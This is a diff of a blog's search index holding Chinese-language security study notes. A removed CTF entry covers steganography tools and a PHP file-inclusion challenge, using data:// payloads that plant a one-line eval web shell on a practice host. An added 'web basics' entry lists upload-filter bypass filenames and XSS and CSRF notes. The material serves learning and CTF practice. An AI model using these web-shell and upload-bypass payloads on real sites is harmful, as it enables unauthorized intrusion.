@@ -143,127 +143,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctf学习笔记</title>
-    <url>/2022/10/19/10-48-16/</url>
-    <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
-<h2 id="一般有两种模式"><a href="#一般有两种模式" class="headerlink" title="一般有两种模式"></a>一般有两种模式</h2><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>解题模式一般就是入侵网站或者靶机，攻击成功后系统会显示flag或者在某个目录 文件 数据库寻找 Flag，提交到答题系统得分。</p>
-<h4 id="此类比赛的赛题形式如下"><a href="#此类比赛的赛题形式如下" class="headerlink" title="此类比赛的赛题形式如下:"></a>此类比赛的赛题形式如下:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA。</span><br><span class="line">  MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</span><br><span class="line"></span><br><span class="line">PPC(Professionally Program Coder)类型，即编程类题目，题目涉及到编程算法，相比ACM较为容易。</span><br><span class="line"></span><br><span class="line">CRYPTO(Cryptography)类型，即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。</span><br><span class="line"></span><br><span class="line">PWN类型，PWN在黑客俚语中代表着攻破、取得权限，多为溢出类题目。</span><br><span class="line"></span><br><span class="line">REVERSE类型，即逆向工程，题目涉及到软件逆向、破解技术。</span><br><span class="line"></span><br><span class="line">STEGA(Steganography)类型，即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛者获取。</span><br><span class="line"></span><br><span class="line">WEB类型，即题目会涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行等漏洞。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在其中MISC杂项STEGA(隐写术)属实是让人意想不到,初次接触我就被吓到了,此类题目一般以文本加密隐写,声音音频隐写,图像加密隐写等等,在后文我会详细学习记录这方面的内容</p>
-<p><strong>注:隐写项目对于真实环境渗透测试提升不大,不必花大量时间去将其原理弄懂,只求在比赛时能基础分辨其属于什么方面的隐写类型,用什么工具解决,确实不懂时可以遇到时百度.</strong></p>
-<h3 id="攻防赛"><a href="#攻防赛" class="headerlink" title="攻防赛"></a>攻防赛</h3><p>需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分.(听fly师傅说这种类型的比赛可能需要邀请函.)</p>
-<p>此类比赛模式非常激烈,准备需要非常充足,</p>
-<h4 id="需要积累足够的防守方案和-EXP-攻击脚本"><a href="#需要积累足够的防守方案和-EXP-攻击脚本" class="headerlink" title="需要积累足够的防守方案和 EXP 攻击脚本"></a>需要积累足够的防守方案和 EXP 攻击脚本</h4><p>(或许我也可以准备这一类的方案,从小开始这样以后也能在工作时给出一个防御方案或者攻击方案,或许是一个不错的主意.)</p>
-<h1 id="MISC杂项"><a href="#MISC杂项" class="headerlink" title="MISC杂项:"></a>MISC杂项:</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://blog.csdn.net/qq_44204058/article/details/119963209"> CTF学习-MISC杂项解题思路_菜鸟-传奇的博客-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/qq_53105813/article/details/125604924?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">CTF MISC解题思路总结篇_Dalean.的博客-CSDN博客_ctf misc解题思路</a></p>
-<p>我抄,不搜不知道,一搜吓一跳,光这杂项就分为:</p>
-<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作:"></a>文件操作:</h2><p> 判断文件类型     </p>
-<p>文件头残缺/错误 </p>
-<p>文件分离操作</p>
-<p>文件合并操作</p>
-<h2 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写:"></a>文件隐写:</h2><h3 id="图片隐写的常见隐写方法"><a href="#图片隐写的常见隐写方法" class="headerlink" title="图片隐写的常见隐写方法"></a>图片隐写的常见隐写方法</h3><p>1.细微的颜色差别<br>2.GIF图多帧隐藏<br>1.颜色通道隐藏<br>2.不同帧图信息隐藏<br>3.不同帧对比隐写<br>3.Exif信息隐藏<br>4.图片修复<br>1.图片头修<br>2.图片尾修复<br>3.CRC校验修复<br>4.长、宽、高度修复<br>5.最低有效位LSB隐写<br>6.图片加密</p>
-<h4 id="记一次图片修复题目"><a href="#记一次图片修复题目" class="headerlink" title="记一次图片修复题目:"></a>记一次图片修复题目:</h4><p>首先是题目链接:</p>
-<p><a href="https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a></p>
-<p>此次题目是二维码图片被垂直剪切为50份,我们要做的就是找出这50份之间的规律,此次题目文件排布规律是按日期排列.</p>
-<p>使用线上图片合并网站<a href="https://cdkm.com/cn/">https://cdkm.com/cn/</a></p>
-<p>进行图片的水平合并,上传文件时需要我们对文件进行一个按日期升序操作,传入图片合并后我们得到一个二维码</p>
-<img src="/imgs/$%7Bfiilename%7D/%E4%BA%8C%E7%BB%B4%E7%A0%81.png" style="zoom:50%;" />
-
-<p>调亮亮度后扫描二维码就能得到flag了</p>
-<p>flag{You Can Repair A Picture From Splices Baesd On Entropy}</p>
-<h3 id="图片隐写常用工具"><a href="#图片隐写常用工具" class="headerlink" title="图片隐写常用工具"></a>图片隐写常用工具</h3><p><strong>Our Secret</strong></p>
-<p>一款用于文件加密的软件</p>
-<p><strong>Firework</strong></p>
-<p>查看隐写的图片文件，多帧gif啥的都可以使用此工具查看</p>
-<p><strong>Stegsove</strong></p>
-<p> 两张图片大小外观像素等基本相同时可以考虑对两个文件进行像素RGB值 XOB ADD SUB等操作，查看是否有有用的信息<br>等等…..</p>
-<p>用到的时候可以直接百度</p>
-<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3><h4 id="音频隐写例子"><a href="#音频隐写例子" class="headerlink" title="音频隐写例子:"></a>音频隐写例子:</h4><p>音频隐写在我第一次打ctf练习题就遇见了,还是第一个遇见的题目,是攻防世界里的来自银河的声音(<a href="https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a>)</p>
-<p>当时做这题时我听了两遍一开始不知道是什么类型的题目,看攻略得知mp3格式的音频文件使用MP3Stego工具进行加解密,然后我真的傻乎乎的按操作方法进行加解密,最后半个小时弄明白了这个工具的使用方法加解密后从这段音频里得到了 Hello Warld! 这句话,提交后发现不对,再进行分析搜索攻略后才发现flag藏在音频信号里,然后又去下了个MMSSTV工具,专门用于音频信号转换.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019181239.png"></p>
-<p>最后转换出的图片中就包含flag,但这flag是采用栅栏密码加密的,所以图上文字栅栏密码解密就得到flag</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019182134.png"></p>
-<p>**付栅栏密码:**栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。</p>
-<p><strong>付攻略链接:</strong><a href="https://blog.csdn.net/qq_62046273/article/details/127096230">( 攻防世界Misc-来自银河的信号_MUFFINHEAD！的博客-CSDN博客</a></p>
-<h4 id="音频隐写分类"><a href="#音频隐写分类" class="headerlink" title="音频隐写分类:"></a>音频隐写分类:</h4><h5 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h5><p>Audacity，Adobe Audition(简称au)，SilentEye，DeepSound，MMSSTV，e2eSoft，mp3stego。</p>
-<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>第一步当然是先听一下有没有什么关键的信息，比如摩斯电码（有间隔的长短电波），SSTV（连续刺耳的电波），拨号隐写之类的。如果不知道是什么声音先自行百度，听过就不会忘。然后打开以上工具看一看是否存在什么隐写，如果都没有办法的话可以欣赏一下音乐就下号了。</p>
-<h6 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h6><p>wav文件头：<code>52494646E6AD250357415645666D7420</code></p>
-<h6 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h6><p><strong>使用工具：Audacity/Adobe Audition</strong><br><strong>文件类型：wav</strong><br>直接放大即可观察波形图即可。<br>可能存在摩斯电码，或者根据波峰波谷然后转换01二进制</p>
-<h6 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h6><p><strong>使用工具：Audacity</strong><br><strong>文件类型：wav</strong><br>查看多视图</p>
-<h6 id="有key的隐写"><a href="#有key的隐写" class="headerlink" title="有key的隐写"></a>有key的隐写</h6><p><strong>使用工具：silenteye、deepsound</strong><br><strong>文件类型：wav</strong><br>傻瓜式操作，知道这个软件就可以解出来，不知道就解不出。这两种隐写不一定需要key，但是有key一定要考虑这两种隐写。</p>
-<h6 id="拨号隐写"><a href="#拨号隐写" class="headerlink" title="拨号隐写"></a>拨号隐写</h6><p>经常打10086的时候对方可能说需要XX服务请按1，需要XX服务请按2，对于不同的数字有不同的声音，就可以隐写一些数据。可以通过DTMF提取出来。<br>DTMF脚本地址：<a href="https://github.com/ribt/dtmf-decoder">https://github.com/ribt/dtmf-decoder</a></p>
-<h6 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h6><p>慢扫描电视（Slow-scan television 简称SSTV）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。<br>表示这玩意真的出烂了，傻瓜式操作<br><strong>使用工具：</strong>MMSSTV，e2eSoft<br>文件类型：wav<br>这里强推虚拟声卡e2eSoft这个工具。SSTV正常解法需要一台设备播放一台设备收音，还容易收到杂音的干扰，虚拟声卡就可以很好的避免这个问题。</p>
-<h6 id="DIFF"><a href="#DIFF" class="headerlink" title="DIFF"></a>DIFF</h6><p><strong>使用工具：Adobe Audition</strong><br><strong>文件类型：wav</strong></p>
-<h6 id="MP3隐写"><a href="#MP3隐写" class="headerlink" title="MP3隐写"></a>MP3隐写</h6><p><strong>使用工具：mp3stego</strong><br><strong>文件类型：mp3</strong></p>
-<p>工具使用方法:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 隐藏信息</span><br><span class="line"># —E 读取隐藏信息文件的内容，-P 设置密码</span><br><span class="line">encode.exe -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line"># 解密信息</span><br><span class="line">decode.exe -X svega_stego.mp3 -P pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h5 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接:"></a>原文链接:</h5><p><a href="https://blog.csdn.net/qq_51652400/article/details/123504708">(CTFmisc常见音频隐写总结_vlan103的博客-CSDN博客_ctf音频隐写</a></p>
-<h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理:"></a>压缩文件处理:</h2><p>1.伪加密</p>
-<p>2.暴力破解</p>
-<p>3.RAR文件格式错误，导致解压不完全</p>
-<h2 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术:"></a>流量取证技术:</h2><p> 工具Wireshark的使用</p>
-<p>无线流量</p>
-<p>usb键盘流量</p>
-<p>键盘流量脚本</p>
-<p>usb鼠标流量分析</p>
-<p>鼠标流量分析脚本</p>
-<p>https流量包分析</p>
-<h1 id="web项目学习"><a href="#web项目学习" class="headerlink" title="web项目学习"></a>web项目学习</h1><h2 id="ctf题目：攻防世界：难度2的-Web-php-include题目"><a href="#ctf题目：攻防世界：难度2的-Web-php-include题目" class="headerlink" title="ctf题目：攻防世界：难度2的 Web_php_include题目"></a>ctf题目：攻防世界：难度2的 Web_php_include题目</h2><p>链接：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3</a></p>
-<p>此题目突破口是php伪协议的运用，</p>
-<p>具体解题可以参考：<a href="https://blog.csdn.net/Mr_helloword/article/details/107929653"> 攻防世界-Web_php_include详解_Mr H的博客-CSDN博客</a></p>
-<p>php伪协议：<a href="https://blog.csdn.net/qq_53142368/article/details/116594299"> PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a></p>
-<h2 id="我的解题过程"><a href="#我的解题过程" class="headerlink" title="我的解题过程"></a>我的解题过程</h2><p>当我拿到题目的时候看到页面如下</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024155409.png"></p>
-<p>第一时间就使用后台扫描工具：御剑 对网站后台进行了扫描</p>
-<p>扫描发现了一个phpmyadmin界面，当时我就想到fly师傅里面记载的phpmyadmin的漏洞利用，翻去查看</p>
-<p>（此网站phpmyadmin后台是无密码的root登录）</p>
-<p>通过一系列操作下来后发现使用phpmyadmin漏洞来解决此题目有点费脑子，因为在运用全局日志文件写入shell和其他方式写入shell都离不开文件的绝对路径，</p>
-<p>在扫描以及信息收集中发现该网站的路径就给了一个“/”并没给出绝对路径，</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024160357.png"></p>
-<p>所以暂时运用phpmyadmin后台那shell的方法不可取</p>
-<h2 id="搜攻略"><a href="#搜攻略" class="headerlink" title="搜攻略"></a>搜攻略</h2><p>在攻略中，老哥给了我们三种通过PHP伪协议拿flag的方法，前两种我都成功拿到了flag，</p>
-<p>但老哥没给出第三种过程，现在我复现一下。</p>
-<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法：</span><br><span class="line">data://text/plain,xxxx(要执行的php代码)</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line">例：</span><br><span class="line">?page=data://text/plain,</span><br><span class="line">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>data伪协议:</p>
-<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
-<p>在这题里面我们通过使用data伪协议写入我们的shell语句</p>
-<p><a href="http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST%5B666%5D);%20?%3E">http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST[666]);%20?%3E</a>      (<?php @eval($_POST[666]); ?>)</p>
-<p><a href="http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==">http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==</a></p>
-<p>两种方式我都试过了,在这题里并没有拦截,使用base64编码和不使用也可以写入shell</p>
-<p>使用菜刀链接到我们的shell</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20221024161817842-1666599525637.png"></p>
-<p>可以看到网站的文件目录,(但我找不到flag文件在哪里,只好抄作业了)</p>
-<p>直接使用虚拟终端cat  打开flag文件</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024162228.png"></p>
-<p>flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意:flag一般形式都不同,像本题就是在=”…”里面: ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
-<h2 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h2><p>此题里面因为存在危险函数:show_source()  才能使用php伪协议破解题目</p>
-<p>所以我们在做题时要留意题中出现的函数是什么有什么功能,不懂可以百度</p>
-<p><strong>重要的还是要细心看题才行,不要养成看到代码就跳过的习惯,不然就白学了.</strong></p>
-<p>show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p>
-<p>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</p>
-<p>show_source() 是 <a href="https://www.runoob.com/php/func-misc-highlight-file.html">highlight_file()</a> 的别名。</p>
-<p><strong>注释：</strong>当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</p>
-<h2 id="其他形式的文件包含题目"><a href="#其他形式的文件包含题目" class="headerlink" title="其他形式的文件包含题目"></a>其他形式的文件包含题目</h2><h3 id="file-include：http-61-147-171-105-62550"><a href="#file-include：http-61-147-171-105-62550" class="headerlink" title="file_include：http://61.147.171.105:62550/"></a>file_include：<a href="http://61.147.171.105:62550/">http://61.147.171.105:62550/</a></h3><p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
-<p>php伪协议：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">(4条消息) 详解php://filter以及死亡绕过_w0s1np的博客-CSDN博客_php://filter</a></p>
-<p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(4条消息) PHP伪协议详解_Snakin_ya的博客-CSDN博客_php伪协议</a></p>
-<p><a href="https://www.php.cn/php-weizijiaocheng-481803.html">PHP伪协议大总结【欢迎收藏】-php教程-PHP中文网</a></p>
-<p>文件包含是一个大项，其中的绕过是一个大学问，这题就涉及其他过滤器的问题。</p>
-<p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">(4条消息) php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
-<p><img src="/imgs/$%7Bfiilename%7D/3.gif"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vlunhub noob靶场总结</title>
     <url>/2022/11/01/14-23-40/</url>
     <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
@@ -418,14 +297,162 @@
       </tags>
   </entry>
   <entry>
-    <title>内网学习笔记</title>
-    <url>/2022/10/19/10-49-13/</url>
-    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+    <title>web基础</title>
+    <url>/2022/10/17/17-43-58/</url>
+    <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
+<p>主要涉及到的都是小迪2020课程里面的内容:</p>
+<p>常常更新</p>
+<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄:"></a>摘抄:</h2><p><strong>1：攻击方与防御方的本质是什么？</strong>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。<strong>2：安全公司的本质是什么？</strong>盈利，最小投入，最大产出。<strong>3：安全公司产品的本质是什么？</strong>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）<strong>4：安全人员的本质是什么？</strong>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。<strong>5：对接客户的本质是什么？</strong>对接客户也是某公司内安全工作的一员，与概念 4 相同。清晰了以上 5 个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念 1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
+<h2 id="HTTP-规划定义了-8-种可能的请求方法："><a href="#HTTP-规划定义了-8-种可能的请求方法：" class="headerlink" title="HTTP 规划定义了 8 种可能的请求方法："></a>HTTP 规划定义了 8 种可能的请求方法：</h2><p>GET：检索 URL 中标识资源的一个简单请求 </p>
+<p>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p>
+<p>POST：服务器接受被写入客户端输出流中的数据的请求 </p>
+<p>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </p>
+<p>DELETE：服务器删除 URL 中命令的资源的请求 </p>
+<p>OPTIONS：关于服务器支持的请求方法信息的请求 </p>
+<p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p>
+<p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 </p>
+<p>#请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p>
+<h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p>1xx：信息，请求收到，继续处理 </p>
+<p>2xx：成功，行为被成功地接受、理解和采纳 </p>
+<p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p>
+<p>4xx：客户端错误 </p>
+<p>5xx：服务器错误 </p>
+<h1 id="信息收集决定攻击深度"><a href="#信息收集决定攻击深度" class="headerlink" title="信息收集决定攻击深度"></a>信息收集决定攻击深度</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20220929190720671.png"></p>
+<h2 id="信息收集是攻击面打开的必要操作"><a href="#信息收集是攻击面打开的必要操作" class="headerlink" title="信息收集是攻击面打开的必要操作"></a>信息收集是攻击面打开的必要操作</h2><p>更多的信息可以测试更多的漏洞方面</p>
+<p>无论是src还是渗透测试一个具体目标</p>
+<p>信息收集的方式多种多样</p>
+<p>有像fofa一样的在黑暗引擎中大海捞针,不错过与测试网站相关的一个页面</p>
+<p>有得到一个web页面后对网站进行扫描,收集IP地址开放的端口号,网站后台目录,后台文件,有时候我们的突破口就产生在这里面</p>
+<p>最常用的就是御剑后台扫描工具,nmap工具,kali里的dirp 工具,部署在服务器端上的msf(这是一个大学问) ,还有一款叫水泽的信息收集工具,等等,后面知道更多了还会添加.</p>
+<p>内网信息收集是针对进入目标主机后进行的信息收集操作,此方面涉及到系统的操作命令学习,</p>
+<p>（<a href="https://blog.csdn.net/qq_43001579/article/details/83591539">(真·Nmap用法大全_车大叔的博客-CSDN博客</a>）</p>
+<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充:"></a>其他补充:</h3><p>F12进行查看网站网络可以看到server：里面的信息</p>
+<p>server：看的信息很全的很可能就是由网页搭建平台搭建的</p>
+<p>WAF存在时，扫描会产生误差，网站可能拒绝访问</p>
+<p>检查时网站返回的数据包里面可能有某些可疑信息，里面可能就是含有WAF</p>
+<p>（X-Powered-By：WAF）</p>
+<p>子域名查找及C段旁注等。</p>
+<h1 id="web漏洞知识点"><a href="#web漏洞知识点" class="headerlink" title="web漏洞知识点"></a>web漏洞知识点</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220905205200543.png"></p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞:"></a>文件上传漏洞:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220906174853666.png"></p>
+<h4 id="查找与判断"><a href="#查找与判断" class="headerlink" title="查找与判断"></a>查找与判断</h4><p>黑盒测试，扫描</p>
+<p>搜索引擎搜索upload</p>
+<p>会员文件传输页面</p>
+<p>后台权限页面</p>
+<p>白盒代码分析查找文件上传源码</p>
+<p>文件上传抓包判断</p>
+<p>黑名单：明确不让上传的格式后缀</p>
+<p>在定义后缀名不完整的情况下，我们可以用其他格式，达到同样效果，看网站的知识应用层面</p>
+<p>白名单：明确可以上传的格式后缀</p>
+<p>更安全一些</p>
+<h3 id="文件上传漏洞测试思维"><a href="#文件上传漏洞测试思维" class="headerlink" title="文件上传漏洞测试思维"></a>文件上传漏洞测试思维</h3><p>1,通过字典扫描，或者判断会员中心等都可能存在文件上传漏洞</p>
+<p>2,到测试站点是否存在解析漏洞如：iis apache Nginx 等</p>
+<p>3,测试文件上传漏洞，是否可以验证或者绕过，上传一个php文档判断黑白名单，判断是否存在格式限制或内容审查</p>
+<p>4,若上面的内容都没有则判断，是否为cms漏洞，在知道cms类型后可以搜索是否爆出过漏洞</p>
+<p>5,如果都没有则再来到编辑器漏洞，判断编辑器类型，搜索漏洞</p>
+<p>6,没有就查找是否爆出过cve词条漏洞</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220908201230886.png">#上传参数名解析：明确哪些东西能修改？</p>
+<p>Content-Disposition：表单数据 一般可更改</p>
+<p>name：表单参数值，不能更改</p>
+<p>filename：文件名，可以更改</p>
+<p>Content-Type：上传文件带的参数值 文件 MIME，视情况更改</p>
+<p>#常见绕过方法：</p>
+<p>数据溢出-防匹配(xxx…)</p>
+<p>符号变异-防匹配（</p>
+<p>‘ “ ;）</p>
+<p>数据截断-防匹配(%00 ; 换行)</p>
+<p>重复数据-防匹配(参数多次)</p>
+<p>#Payload:</p>
+<p>大量垃圾数据缓冲溢出(Content-Disposition,filename 等)</p>
+<p>filename=x.php</p>
+<p>filename=”x.php</p>
+<p>filename=’x.php</p>
+<p>filename=”a.jpg;.php”;</p>
+<p>filename=”a.php%00.jpg”</p>
+<p>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
+<p>filename=”x.jpg”;filename=”x.jpg”;…..filename=”x.php”;</p>
+<p>filename=”xxx/x.jpg”</p>
+<p>filename=</p>
+<p>“</p>
+<p>x</p>
+<p>.</p>
+<p>p</p>
+<p>h</p>
+<p>p</p>
+<p>“</p>
+<p>/jpeg；/x.php   xxxx/x.php</p>
+<h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p>
+<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+<p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
+<h2 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h2><p><strong>跨网站脚本（Cross-site scripting，XSS）</strong> 又称为跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。XSS是由于Web应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<h2 id="CSRF和SSRF"><a href="#CSRF和SSRF" class="headerlink" title="CSRF和SSRF"></a>CSRF和SSRF</h2><h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>使用burp里自带的工具</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221017191959.png"></p>
+<p>此漏洞利用：修改信息，添加管理员</p>
+<p>注意网站有无添加，修改功能才可能有csrf漏洞存在</p>
+<p>如果测试后没有变化，网站不存在这个漏洞</p>
+<ol>
+<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
+<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li>
+<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
+</ol>
